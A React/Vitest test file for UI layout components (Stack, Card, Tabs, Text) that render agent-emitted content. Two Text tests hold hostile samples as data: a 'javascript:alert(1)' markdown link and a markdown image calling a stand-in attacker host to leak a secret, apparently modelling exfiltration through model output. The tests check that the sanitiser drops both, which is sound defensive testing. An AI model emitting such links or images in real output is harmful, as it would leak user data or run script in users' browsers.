import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { z } from "zod";

// Mock @openuidev/react-lang — needed because defineOpenUIComponent calls defineComponent at import time
vi.mock("@openuidev/react-lang", () => ({
  defineComponent: (config: Record<string, unknown>) => ({
    ...config,
    ref: z.any(),
  }),
  useFormName: () => "",
  useGetFieldValue: () => () => "",
  useSetFieldValue: () => vi.fn(),
  useTriggerAction: () => vi.fn(),
  FormNameContext: {
    Provider: ({ children }: { children: React.ReactNode }) => children,
  },
}));

import { Card } from "../components/layout/card";
import { Stack } from "../components/layout/stack";
import { Tabs } from "../components/layout/tabs";
import { Text } from "../components/layout/text";

const renderNode = (value: unknown) => <span data-testid="child">{String(value)}</span>;

describe("Stack", () => {
  const Component = Stack.component;

  it("renders children in a flex container", () => {
    const { container } = render(
      <Component props={{ children: ["a", "b"] }} renderNode={renderNode} />
    );
    const flex = container.firstElementChild!;
    expect(flex.className).toContain("flex");
    expect(flex.className).toContain("flex-col");
    expect(screen.getAllByTestId("child")).toHaveLength(2);
  });

  it("applies row direction and gap classes", () => {
    const { container } = render(
      <Component props={{ direction: "row", gap: "lg", children: ["a"] }} renderNode={renderNode} />
    );
    const flex = container.firstElementChild!;
    expect(flex.className).toContain("flex-row");
    expect(flex.className).toContain("gap-6");
  });

  it("applies alignment classes", () => {
    const { container } = render(
      <Component props={{ align: "center", children: [] }} renderNode={renderNode} />
    );
    expect(container.firstElementChild!.className).toContain("items-center");
  });

  it("handles undefined children gracefully", () => {
    const { container } = render(<Component props={{}} renderNode={renderNode} />);
    expect(container.firstElementChild).toBeTruthy();
  });
});

describe("Card", () => {
  const Component = Card.component;

  it("renders title and description", () => {
    render(
      <Component
        props={{ title: "My Card", description: "Card description" }}
        renderNode={renderNode}
      />
    );
    expect(screen.getByText("My Card")).toBeInTheDocument();
    expect(screen.getByText("Card description")).toBeInTheDocument();
  });

  it("renders children", () => {
    render(<Component props={{ title: "Test", children: ["child1"] }} renderNode={renderNode} />);
    expect(screen.getByTestId("child")).toBeInTheDocument();
  });

  it("renders without description", () => {
    render(<Component props={{ title: "Title Only" }} renderNode={renderNode} />);
    expect(screen.getByText("Title Only")).toBeInTheDocument();
  });

  it("omits the CardContent wrapper when children is an empty array", () => {
    // Reproduces the bug where an agent-emitted `Card(title, desc, [])` was
    // rendering a visible empty padded box beneath the description. The
    // CardContent class is what shadcn applies the body padding to, so we
    // assert it isn't present on the rendered tree at all.
    const { container } = render(
      <Component
        props={{ title: "Header Only", description: "no body", children: [] }}
        renderNode={renderNode}
      />
    );
    expect(screen.getByText("Header Only")).toBeInTheDocument();
    expect(screen.getByText("no body")).toBeInTheDocument();
    // shadcn's CardContent has data-slot="card-content"; the wrapper
    // shouldn't be in the DOM when children is empty.
    expect(container.querySelector('[data-slot="card-content"]')).toBeNull();
  });

  it("omits the CardContent wrapper when children is undefined", () => {
    const { container } = render(
      <Component props={{ title: "Title only" }} renderNode={renderNode} />
    );
    expect(container.querySelector('[data-slot="card-content"]')).toBeNull();
  });
});

describe("Tabs", () => {
  const Component = Tabs.component;

  it("renders tab triggers with labels", () => {
    render(
      <Component
        props={{
          tabs: [
            { id: "tab1", label: "First" },
            { id: "tab2", label: "Second" },
          ],
          children: ["content1", "content2"],
        }}
        renderNode={renderNode}
      />
    );
    expect(screen.getByText("First")).toBeInTheDocument();
    expect(screen.getByText("Second")).toBeInTheDocument();
  });

  it("renders a tablist with aria-label", () => {
    render(
      <Component
        props={{
          tabs: [{ id: "t1", label: "Tab" }],
          children: ["c"],
        }}
        renderNode={renderNode}
      />
    );
    expect(screen.getByRole("tablist")).toHaveAttribute("aria-label", "Content tabs");
  });

  it("returns null when tabs array is empty", () => {
    const { container } = render(
      <Component props={{ tabs: [], children: [] }} renderNode={renderNode} />
    );
    expect(container.firstChild).toBeNull();
  });
});

describe("Text", () => {
  const Component = Text.component;

  it("renders markdown prose without a container box", () => {
    const { container } = render(
      <Component props={{ content: "This is a **flow**, not a rule." }} renderNode={renderNode} />
    );
    expect(screen.getByText("flow").tagName).toBe("STRONG");
    const root = container.firstElementChild!;
    expect(root.className).not.toMatch(/border|shadow|rounded|bg-/);
  });

  it("keeps the text of unsafe links but drops the link", () => {
    render(
      <Component
        props={{ content: "[click](javascript:alert(1)) and [docs](https://docs.loomloyalty.com)" }}
        renderNode={renderNode}
      />
    );
    expect(screen.getAllByRole("link")).toHaveLength(1);
    expect(screen.getByText(/click and/)).toBeInTheDocument();
    const docs = screen.getByRole("link", { name: "docs" });
    expect(docs).toHaveAttribute("href", "https://docs.loomloyalty.com");
    expect(docs).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("drops markdown images so model output can't auto-load a URL", () => {
    const { container } = render(
      <Component
        props={{ content: "See ![leak](https://attacker.example/?d=secret) here." }}
        renderNode={renderNode}
      />
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("supports a muted tone", () => {
    const { container } = render(
      <Component props={{ content: "Side note.", tone: "muted" }} renderNode={renderNode} />
    );
    expect(container.firstElementChild!.className).toContain("text-muted-foreground");
  });
});
